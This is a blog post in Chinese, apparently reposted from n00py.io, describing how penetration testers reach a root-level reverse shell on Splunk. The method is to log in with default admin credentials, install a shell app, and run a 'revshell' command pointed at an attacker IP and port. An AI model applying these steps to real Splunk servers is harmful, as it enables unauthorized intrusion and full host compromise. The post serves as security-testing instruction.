---
layout:     post
title:      Splunk Shell
date:       2018-12-08
author:     Wh0ale
header-img: img/wallhaven-701358.jpg
catalog: true
tags:
    - 奇技淫巧
    - Splunk
---

我不时地在测试网络时遇到Splunk。Splunk 是一个用于搜索，分析和可视化数据的软件平台。它对各种用途都非常有用。作为一个测试者，它可能很有用，因为它通常包含各种数据，其中一些可能是敏感的。 

获得对Splunk的访问权限可以通过密码猜测或利用以前受到破坏的凭据重用密码来完成。我有过使用“**admin**：**admin** ”或“ **admin**：**changeme** ” 登录进入管理控制台很容易的情况。

一个鲜为人知的技巧是你可以使用Splunk应用程序来执行python。[TBG Security](https://tbgsecurity.com/)的酷团队开发了一款可用于测试的Splunk应用程序。2017年，他们在[许多缺点上](https://github.com/TBGSecurity/weaponize_splunk)展示了他们的应用程序。尽管如此，我觉得很少有人知道这个工具，我觉得它值得更多的关注。

使用它非常容易。首先，您只需要从Splunk Shells [GitHub](https://github.com/TBGSecurity/splunk_shells)页面下载它。下载该版本。

登录Splunk管理控制台后，单击“应用程序”栏并单击“ *管理应用程序”*。

[![img](https://www.n00py.io/wp-content/uploads/2018/10/add_app.png)](https://www.n00py.io/wp-content/uploads/2018/10/add_app.png)

进入“应用”面板后，单击“ *从文件安装应用* ”。

[![img](https://www.n00py.io/wp-content/uploads/2018/10/app-from-file.png)](https://www.n00py.io/wp-content/uploads/2018/10/app-from-file.png)

单击“浏览”按钮并上载tar.gz文件。

[![img](https://www.n00py.io/wp-content/uploads/2018/10/upload_app.png)](https://www.n00py.io/wp-content/uploads/2018/10/upload_app.png)

上传应用后，必须重新启动Splunk。重新启动后，重新登录Splunk并返回“ *应用* ”页面。单击权限，当您看到“*共享* ”选项时，单击“ *所有应用程序* ” 单选按钮。

[![img](https://www.n00py.io/wp-content/uploads/2018/10/edit-properties.png)](https://www.n00py.io/wp-content/uploads/2018/10/edit-properties.png)

安装应用程序后，最后要做的就是捕获shell。你有这里的选择，但我选择通过Metasploit使用标准的反向shell。

[![img](https://www.n00py.io/wp-content/uploads/2018/10/msfsetup.png)](https://www.n00py.io/wp-content/uploads/2018/10/msfsetup.png)

一旦您的MSF处理程序（或netcat侦听器）启动并运行，您可以通过键入以下内容来触发应用程序：

```
| revshell SHELLTYPE ATTACKERIP ATTACKERPORT
```

[![img](https://www.n00py.io/wp-content/uploads/2018/10/splunk-rev.png)](https://www.n00py.io/wp-content/uploads/2018/10/splunk-rev.png)

这将立即执行应用程序，你应该让你的shell回电话。

[![img](https://www.n00py.io/wp-content/uploads/2018/10/shell-opened.png)](https://www.n00py.io/wp-content/uploads/2018/10/shell-opened.png)

我在Splunk 7.0上进行了测试，它运行得很好。Splunk通常以root身份运行。这为攻击者提供了很多机会来枚举主机本身的其他信息，而不仅仅是在数据库中。

**更新：**

另一种选择是使用Tevora的这一[系列应用程序](https://github.com/tevora-threat/splunk_pentest_app)。[在这里](https://threat.tevora.com/penetration-testing-with-splunk-leveraging-splunk-admin-credentials-to-own-the-enterprise/)查看[他们的文章](https://threat.tevora.com/penetration-testing-with-splunk-leveraging-splunk-admin-credentials-to-own-the-enterprise/)，他们讨论弹出shell，提取密码和部署到通用转发器。

**再次更新（10/20/2018）：**

我在这里了解到另一个Splunk Web shell：[https](https://github.com/f8al/TA-Shell)：[//github.com/f8al/TA-Shell](https://github.com/f8al/TA-Shell)

CC：[SecurityShrimp](https://twitter.com/Securityshrimp)

 

转载自：https://www.n00py.io/2018/10/popping-shells-on-splunk/

splunk shell： https://github.com/TBGSecurity/splunk_shells
